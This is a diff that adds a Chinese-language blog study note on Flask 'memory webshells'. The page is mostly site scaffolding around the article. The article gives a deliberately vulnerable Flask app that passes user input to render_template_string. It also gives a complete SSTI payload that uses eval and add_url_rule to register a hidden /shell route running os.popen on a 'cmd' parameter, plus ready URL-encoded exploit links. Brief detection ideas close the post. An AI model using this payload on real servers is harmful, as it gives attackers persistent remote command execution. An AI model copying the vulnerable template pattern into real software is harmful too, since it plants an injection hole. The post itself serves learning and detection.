@@ -1,0 +1,866 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/favicon.jpg">
+  <link rel="icon" href="/img/favicon/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="BadWolf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="本篇文章主要介绍内存马中Python内存马原理及其攻击手段。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马学习之Python内存马">
+<meta property="og:url" content="https://genioco.github.io/2022/05/06/Learn/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B9%8BPython%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="BadWolf&#39;s Blog">
+<meta property="og:description" content="本篇文章主要介绍内存马中Python内存马原理及其攻击手段。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/06dd557080dc4a538085154b10e7f015.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e707a90064db430089a5275bcf85a821.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8183b93a3a084666831279f71d9b9bf5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/45b0e83a4b484d339bb2b03bccfb9e25.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a4b3f63351f74c5980145d832fe8fb70.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/539d27ecc22f4e6891a478530328c717.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/63f7ad2bcda0490391536a3d91e22c41.png">
+<meta property="article:published_time" content="2022-05-06T06:23:00.000Z">
+<meta property="article:modified_time" content="2022-09-12T01:34:00.000Z">
+<meta property="article:author" content="BadWolf">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/06dd557080dc4a538085154b10e7f015.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内存马学习之Python内存马 - BadWolf&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/js/shubiao.css">
+<link rel="stylesheet" href="/js/scroll.css">
+<link rel="stylesheet" href="/js/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?839133d5bbdb7688edec52dfcde2a75b";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>BadWolf&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内存马学习之Python内存马"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        BadWolf
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-06 14:23" pubdate>
+          2022年5月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内存马学习之Python内存马</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2022年9月12日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer">
+
+<h2 id="内存马学习之Python内存马"><a href="#内存马学习之Python内存马" class="headerlink" title="内存马学习之Python内存马"></a>内存马学习之Python内存马</h2><h3 id="Python内存马原理"><a href="#Python内存马原理" class="headerlink" title="Python内存马原理"></a>Python内存马原理</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Python内存马利用flask框架中ssti注入来实现，flask框架中在web应用模板渲染的过程中用到<span class="hljs-built_in">render_template_string</span>()进行渲染但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现python内存马的注入。<br></code></pre></td></tr></table></figure>
+
+<p>参考链接</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121005608">https://blog.csdn.net/rfrder/article/details/121005608</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p><strong>app.addurl_rule()用法</strong></p>
+<p><code>app.add_url_rule()</code>是一种生成url规则的函数，在flask中<code>@app.route(&#39;&lt;url&gt;&#39;)</code>就是调用的<code>app.add_url_rule()</code>，简单理解就是该函数将url中的<code>/&lt;str&gt;</code>绑定指定函数执行。。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">app.add_url_rule(<span class="hljs-string">&#x27;/index/&#x27;</span>,<span class="hljs-attribute">endpoint</span>=<span class="hljs-string">&#x27;index&#x27;</span>,view_func=index，methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<p>app.addurl_rule的三个参数：第一个参数指定url规则，当访问&#x2F;index符合本条规则，endpoint设置url的名字，url_for可通过名字返回url，view_func参数指定本规则绑定的函数,methods指定规则访问限制。</p>
+<p><strong>lambda表达式</strong></p>
+<p>lambda表达式官方语言<code>匿名函数</code>，基本格式。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-built_in">lambda</span> [arg1 [,arg2,.....argn]]<span class="hljs-symbol">:expression</span><br></code></pre></td></tr></table></figure>
+
+<p>实际上就是函数的简写，去掉了函数名，简单写个比较就明白了。</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">lambda <span class="hljs-variable language_">x</span>,<span class="hljs-variable language_">y</span>:<span class="hljs-variable language_">x</span>+<span class="hljs-variable language_">y</span><br>等价于<br>def add(<span class="hljs-variable language_">x</span>,<span class="hljs-variable language_">y</span>):<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable language_">x</span>+<span class="hljs-variable language_">y</span>;<br></code></pre></td></tr></table></figure>
+
+<p><strong>偏函数partial</strong></p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">在python中，如果在设置某个函数的时候需要把函数的某个参数设置为固定的值，就可以使用偏函数来实现.<br></code></pre></td></tr></table></figure>
+
+<p>可以理解为将函数的某些参数设置为固定值，重新命名方便使用，举个例子</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">from</span> functools import partial<br> <br>def <span class="hljs-keyword">mod</span>( n, m ):<br>  <span class="hljs-keyword">return</span> n % m<br> <br>mod_by_10 = partial( <span class="hljs-keyword">mod</span>, m=<span class="hljs-number">10</span> )<br> <br><span class="hljs-keyword">print</span> <span class="hljs-keyword">mod</span>( <span class="hljs-number">77</span>,<span class="hljs-number">10</span> )  <span class="hljs-meta"># 7</span><br><span class="hljs-keyword">print</span> mod_by_10( <span class="hljs-number">77</span> )  <span class="hljs-meta"># 7</span><br></code></pre></td></tr></table></figure>
+
+<p><code>mod(n,m)</code>表示n模m，是个通用函数，但是如果我只是用模10，需要每次都指定m&#x3D;10吗？偏函数的功能就是解决这个问题，我们可以在<code>mod(n,m)</code>重新命令一个函数<code>mod_by_100(n)</code>，由于他是有<code>mod(n,m)</code>扩展来的，所以需要指定参数<code>m=100</code>，<code>mod_by_100 = partial( mod, 100 )</code>，第一个参数mod就是扩展原函数<code>mod(n,m)</code>，原函数的各个参数依次作为<code>partial()</code>函数后续的参数，除非使用关键字参数。</p>
+<h3 id="实战步骤"><a href="#实战步骤" class="headerlink" title="实战步骤"></a><strong>实战步骤</strong></h3><p>简单编写一个flask sstl实例，内容是访问&#x2F;index加上content参数就会被渲染，渲染的content和name内容是用户可控，利用这点生成内存马。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, url_for, redirect, request, render_template_string<br>app = Flask(__name__)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/index&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun</span>():<br>    content = request.args.get(<span class="hljs-string">&quot;content&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    person = <span class="hljs-string">&#x27;knave&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hi/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hi</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello flask!&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>原始Flask内存马payload</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<br>	<span class="hljs-comment">&quot;app.add_url_rule(</span><br>		<span class="hljs-string">&#x27;/shell&#x27;</span>, <br>		<span class="hljs-string">&#x27;shell&#x27;</span>, <br>		lambda :__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>)).<span class="hljs-keyword">read</span>()<br>		)<br>	<span class="hljs-comment">&quot;,</span><br>	&#123;<br>		<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<br>		<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]<br>	&#125;<br>)<br></code></pre></td></tr></table></figure>
+
+<p>payload解析</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__class__</span>：返回调用的参数类型<br><br><span class="hljs-variable">__bases__</span>：返回基类列表<br><br><span class="hljs-variable">__builtins__</span>：内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-<span class="hljs-built_in">in</span> 函数，例如eval, <span class="hljs-built_in">exec</span>, open等<br><br><span class="hljs-variable">__globals__</span>：以字典的形式返回函数所在的全局命名空间所定义的全局变量,这里的函数可以是类class的构造函数如<span class="hljs-variable">__init__</span>,也可以是flask的函数如url_for等。<br></code></pre></td></tr></table></figure>
+
+<p><code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code></p>
+<p>url_for是Flask的一个内置函数：作用是根据函数名称和已有规则生成对应url。</p>
+<p><img src="https://img-blog.csdnimg.cn/06dd557080dc4a538085154b10e7f015.png" srcset="/img/loading.gif" lazyload alt="image-20220610172705958"></p>
+<p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p>
+<p><img src="https://img-blog.csdnimg.cn/e707a90064db430089a5275bcf85a821.png" srcset="/img/loading.gif" lazyload alt="image-20220610181036433"></p>
+<p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的。</p>
+<p><img src="https://img-blog.csdnimg.cn/8183b93a3a084666831279f71d9b9bf5.png" srcset="/img/loading.gif" lazyload alt="image-20220610181116081"></p>
+<p>直接调用就能执行命令了，但是命令输出并未回显而是显示在终端中</p>
+<p><img src="https://img-blog.csdnimg.cn/45b0e83a4b484d339bb2b03bccfb9e25.png" srcset="/img/loading.gif" lazyload alt="image-20220610181636124"></p>
+<p><img src="https://img-blog.csdnimg.cn/a4b3f63351f74c5980145d832fe8fb70.png" srcset="/img/loading.gif" lazyload alt="image-20220610181724351"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<br>	<span class="hljs-comment">&quot;app.add_url_rule(</span><br>		<span class="hljs-string">&#x27;/shell&#x27;</span>, <br>		<span class="hljs-string">&#x27;shell&#x27;</span>, <br>		lambda :__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;cmd&#x27;</span>)).<span class="hljs-keyword">read</span>()<br>		)<br>	<span class="hljs-comment">&quot;,</span><br>	&#123;<br>		<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<br>		<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]<br>	&#125;<br>)<br></code></pre></td></tr></table></figure>
+
+<p>add_url_rule()添加了一个url为&#x2F;shell的路由，绑定匿名函数<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;)).read()</code></p>
+<p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例。</p>
+<p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p>
+<p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>. <code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>. <code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>.</p>
+<p>eval基本用法</p>
+<p><img src="https://img-blog.csdnimg.cn/539d27ecc22f4e6891a478530328c717.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><strong>访问如下URL生成Flask内存马：</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5000</span>/<span class="hljs-keyword">index</span>?content=&#123;&#123;a.__init__.__globals__[<span class="hljs-variable">%27__builtins_</span>_<span class="hljs-variable">%27</span>][<span class="hljs-variable">%2</span>7eval<span class="hljs-variable">%27</span>](<span class="hljs-variable">%22app</span>.add_url_rule(<span class="hljs-variable">%27</span>/shell1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7shell<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0lambda<span class="hljs-variable">%20</span>:__import__(<span class="hljs-variable">%2</span>7os<span class="hljs-variable">%27</span>).popen(_request_ctx_stack.top.request.args.get(<span class="hljs-variable">%2</span>7cmd<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7whoami<span class="hljs-variable">%27</span>)).read())<span class="hljs-variable">%22</span>,<span class="hljs-variable">%20</span>&#123;<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>:<span class="hljs-variable">%20url_for</span>.__globals__[<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>],<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7app<span class="hljs-variable">%27</span>:<span class="hljs-variable">%20url_for</span>.__globals__[<span class="hljs-variable">%27current</span>_app<span class="hljs-variable">%27</span>]&#125;)&#125;&#125;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5000</span>?name=&#123;&#123;url_for.__globals__[<span class="hljs-variable">%27__builtins_</span>_<span class="hljs-variable">%27</span>][<span class="hljs-variable">%2</span>7eval<span class="hljs-variable">%27</span>](<span class="hljs-string">&quot;app.add_url_rule(<span class="hljs-variable">%27</span>/shell<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7shell<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0lambda<span class="hljs-variable">%20</span>:__import__(<span class="hljs-variable">%2</span>7os<span class="hljs-variable">%27</span>).popen(_request_ctx_stack.top.request.args.get(<span class="hljs-variable">%2</span>7cmd<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>0<span class="hljs-variable">%2</span>7whoami<span class="hljs-variable">%27</span>)).read())&quot;</span>,&#123;<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>:url_for.__globals__[<span class="hljs-variable">%27_request_ctx</span>_stack<span class="hljs-variable">%27</span>],<span class="hljs-variable">%2</span>7app<span class="hljs-variable">%27</span>:url_for.__globals__[<span class="hljs-variable">%27current</span>_app<span class="hljs-variable">%27</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1:5000/shell1?cmd=<span class="hljs-built_in">id</span><br>http://127.0.0.1:5000/shell?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/63f7ad2bcda0490391536a3d91e22c41.png" srcset="/img/loading.gif" lazyload alt="image-20220609212421796"></p>
+<h3 id="检测思路"><a href="#检测思路" class="headerlink" title="检测思路"></a>检测思路</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> 查 看 所 有 内 建 模 块 中 是 否 包 含 <span class="hljs-built_in">eval</span> 、 <span class="hljs-built_in">exec</span> 等 可 以 执 行 代 码 的 函 数 如 ： <span class="hljs-keyword">class</span>‘warnings.catch_warnings’、<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>等。<br><span class="hljs-number">2.</span> 检测<span class="hljs-variable language_">self</span>.add_url_rule()中特殊名字的路由如shell等。<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+        <a href="/tags/Python/" class="print-no-link">#Python</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内存马学习之Python内存马</div>
+      <div>https://genioco.github.io/2022/05/06/Learn/内存马学习之Python内存马/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>BadWolf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年5月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
